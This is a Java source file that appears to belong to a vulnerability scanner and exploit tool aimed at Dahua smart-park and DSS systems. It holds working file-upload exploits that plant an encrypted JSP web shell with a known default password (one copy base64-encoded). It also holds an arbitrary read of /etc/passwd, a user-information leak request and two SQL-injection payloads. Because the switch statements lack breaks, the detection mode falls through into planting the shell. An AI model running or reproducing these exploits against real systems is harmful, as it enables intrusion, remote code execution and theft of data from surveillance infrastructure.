package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.*;
import com.alibaba.fastjson.JSONObject;

import java.io.IOException;
import java.net.MalformedURLException;



@BasicMapping(uri = "大华")
public class DaHuaController extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 publishing_video 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_Uploadfile1(Poc_Exp type, String target, Object... args) throws IOException {
        WriteLog("\n[*]开始检测：  大华智慧园区 publishing_video 文件上传漏洞");
        String url = "/publishing/publishing/material/file/video";
        String boundary = "dd8f988919484abab3816881c55272a7";
        String data = "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"Filedata\"; filename=\"0EaE10E7dF5F10C2.jsp\"\r\n" +
                "Submit\r\n"+
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"poc\"\r\n" +
                "poc\r\n"+
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"Submit\"\r\n\r\n" +
                "test\r\n" +
                "--" + boundary + "--\r\n";

        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result = httpRequest.Post(data);
                if (result.responseBody.contains("{")){
                    JSONObject jsonObject = JSONObject.parseObject(result.responseBody);
                    JSONObject dataObject = jsonObject.getJSONObject("data");
                    String pathValue = dataObject.getString("path");
                    WriteLog("\n" +pathValue);
                    if (result.statusCode == 200 && pathValue != ""){
                        WriteLog("\n[*] 存在漏洞");
                        WriteLog("\n[*] 访问链接："+target+"/publishingImg/"+pathValue);
                    }
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                data = data.replace("test",payload);
                HttpRequest httpRequest1 = new HttpRequest(target+url);
                httpRequest1.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result1 = httpRequest1.Post(data);
                if (result1.responseBody.contains("{")){
                    JSONObject jsonObject1 = JSONObject.parseObject(result1.responseBody);
                    JSONObject dataObject1 = jsonObject1.getJSONObject("data");
                    String pathValue1 = dataObject1.getString("path");
                    if (result1.statusCode == 200 && pathValue1 != ""){
                        WriteLog("\n[*] 存在漏洞");
                        WriteLog("\n[*] 访问链接："+target+"/publishingImg/"+pathValue1);
                        WriteLog("\n[*] 冰蝎链接："+"默认连接密码rebeyond");
                    }
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }

        }
    }

    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 poi 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_Uploadfile2(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  大华智慧园区 poi 文件上传漏洞");
        String randomStr = Utils.getRandomString(4)+".jsp";
        String url = "/emap/webservice/gis/soap/poi";
        String data ="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                " <soapenv:Header/>\n" +
                " <soapenv:Body>\n" +
                " <res:uploadPicFile>\n" +
                " <!--type: string-->\n" +
                " <arg0>/../../filename</arg0>\n" +
                " <!--type: base64Binary-->\n" +
                " <arg1>Cjwlb3V0LnByaW50KCJoZWxsb++8ge+8gSIpOyU+</arg1>\n" +
                " </res:uploadPicFile>\n" +
                " </soapenv:Body>\n" +
                "</soapenv:Envelope>";
        switch (type){
            case POC:
                data = data.replace("filename",randomStr);
                HttpRequest httpRequest =new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","text/xml;charset=UTF-8");
                Response result = httpRequest.Post(data);
                if (result.statusCode == 200 && result.responseBody.contains("<code>1")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/upload/"+randomStr);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                data = data.replace("filename",randomStr);
                String payload = "PCVAcGFnZSBpbXBvcnQ9XCJqYXZhLnV0aWwuKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qXCIlPjwlIWNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX0lPjwlaWYgKHJlcXVlc3QuZ2V0TWV0aG9kKCkuZXF1YWxzKFwiUE9TVFwiKSl7U3RyaW5nIGs9XCJlNDVlMzI5ZmViNWQ5MjViXCI7c2Vzc2lvbi5wdXRWYWx1ZShcInVcIixrKTtDaXBoZXIgYz1DaXBoZXIuZ2V0SW5zdGFuY2UoXCJBRVNcIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoay5nZXRCeXRlcygpLFwiQUVTXCIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4KICAgICAgICAgICAgICAgIA==";
                data = data.replace("Cjwlb3V0LnByaW50KCJoZWxsb++8ge+8gSIpOyU+",payload);
                HttpRequest httpRequest1 =new HttpRequest(target+url);
                httpRequest1.addHeaders("Content-Type","text/xml;charset=UTF-8");
                Response result1 = httpRequest1.Post(data);
                if (result1.statusCode == 200 && result1.responseBody.contains("<code>1")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/upload/"+randomStr);
                    WriteLog("\n[*] 冰蝎链接，默认连接密码rebeyond");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }


    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 devicePoint_addImgIco 文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_Uploadfile3(Poc_Exp type, String target, Object... args) throws IOException {
        WriteLog("\n[*]开始检测：  大华智慧园区 devicePoint_addImgIco 文件上传漏洞");
        String url = "/emap/devicePoint_addImgIco?hasSubsystem=true";
        String boundary = "WebKitFormBoundary9PggsiM755PLa54a";
        String data = "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\"B5FJnD.jsp\"\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "Content-Transfer-Encoding: binary\r\n\r\n" +
                "5f8be5deb136b12c1\r\n" +
                "--" + boundary + "--\r\n";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result = httpRequest.Post(data);
                JSONObject jsonObject = JSONObject.parseObject(result.responseBody);
                String dataValue = jsonObject.getString("data");
                WriteLog("\n" +dataValue);
                if (result.statusCode == 200 && dataValue != ""){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/upload/emap/society_new/"+dataValue);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
                data = data.replace("5f8be5deb136b12c1",payload);
                HttpRequest httpRequest1 = new HttpRequest(target+url);
                httpRequest1.addHeaders("Connection", "close");
                httpRequest1.addHeaders("Content-Type", "multipart/form-data; boundary=" + boundary);
                Response result1 = httpRequest1.Post(data);
                JSONObject jsonObject1 = JSONObject.parseObject(result1.responseBody);
                String dataValue1 = jsonObject1.getString("data");
                WriteLog("\n" +dataValue1);
                if (result1.statusCode == 200 && dataValue1 != ""){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+"/upload/emap/society_new/"+dataValue1);
                    WriteLog("\n[*] 冰蝎链接："+"默认连接密码rebeyond");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "大华 DSS 任意文件读取漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_Dss(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  大华 DSS 任意文件读取漏洞");
        String url = "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd";
        switch (type){
            case POC:
                HttpRequest httpRequest =new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if (result.statusCode == 200 && result.responseBody.contains("root")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 getUserInfoByUserName 信息泄露漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_getUserInfo(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  大华智慧园区 getUserInfoByUserName 信息泄露漏洞");
        String url = "/admin/user_getUserInfoByUserName.action?userName=system";
        switch (type){
            case POC:
                HttpRequest httpRequest =new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if (result.statusCode == 200 && result.responseBody.contains("id")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 searchJson SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_SQLi1(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  大华智慧园区 searchJson SQL注入漏洞");
        String url = "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B\"orderBy\":\"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--\"%7D/extend/%7B%7D";
        switch (type){
            case POC:
                HttpRequest httpRequest =new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if (result.statusCode == 500 && result.responseBody.contains("1e469dbcb9211897b5f5ebf866c66f3")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "大华智慧园区 carQuery SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_carQuerySQL(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  大华智慧园区 carQuery SQL注入漏洞");
        String url = "/portal/services/carQuery";
        String data ="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\n" +
                "   <soapenv:Header/>\n" +
                "   <soapenv:Body>\n" +
                "      <car:getFaceCapture>\n" +
                "         <!--Optional:-->\n" +
                "         <searchJson>{}</searchJson>\n" +
                "         <!--Optional:-->\n" +
                "         <pageJson>{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,(select md5(388609)),0x7e),1)-- qwe\"}</pageJson>\n" +
                "         <!--Optional:-->\n" +
                "         <extend>{}</extend>\n" +
                "      </car:getFaceCapture>\n" +
                "   </soapenv:Body>\n" +
                "</soapenv:Envelope>";
        switch (type){
            case POC:
                HttpRequest httpRequest =new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","text/xml;charset=UTF-8");
                httpRequest.addHeaders("SOAPAction","");
                Response result = httpRequest.Post(data);
                if (result.statusCode == 500 && result.responseBody.contains("1e469dbcb9211897b5f5ebf866c66f3")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+url);
                    WriteLog("\n[*] 请求包："+data);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }


}
